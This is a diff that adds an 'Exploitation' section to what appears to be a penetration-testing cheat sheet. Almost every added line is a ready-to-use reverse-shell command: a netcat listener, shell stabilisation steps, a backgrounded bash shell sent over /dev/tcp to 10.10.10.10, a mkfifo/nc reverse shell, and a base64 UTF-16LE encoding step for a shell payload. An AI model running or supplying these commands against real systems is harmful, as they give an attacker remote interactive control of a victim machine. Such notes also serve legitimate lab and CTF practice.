@@ -285,6 +285,33 @@ http 127.0.0.1 8080
 
 ## Exploitation
 
+```bash
+rlwrap ncat -nvlp 9000
+
+# Stablisation
+python -c 'import pty; pty.spawn("/bin/sh")'
+export TERM=xterm
+CTRL+Z
+stty raw -echo; fg
+
+
+# Power of Two is One with `nohup` and `&`
+# This allows you from one shell create another as a nohup job and background it 
+# Two shell from one shell
+# Will not work in `script /dev/null -c bash` TTY spawns!
+nohup bash -i &>/dev/tcp/10.10.10.10/1337 &
+jobs -l # list pids
+kill -0 $PID # to kill the nohup job
+```
+Netcat without -e
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
+```
+
+```bash
+iconv -f ASCII -t UTF-16LE rshell.txt | tr -d "\n" | base64 -w0 
+```
+
 Backup the exploit code
 ```bash
 cp $file.$ext $file.$ext.bak
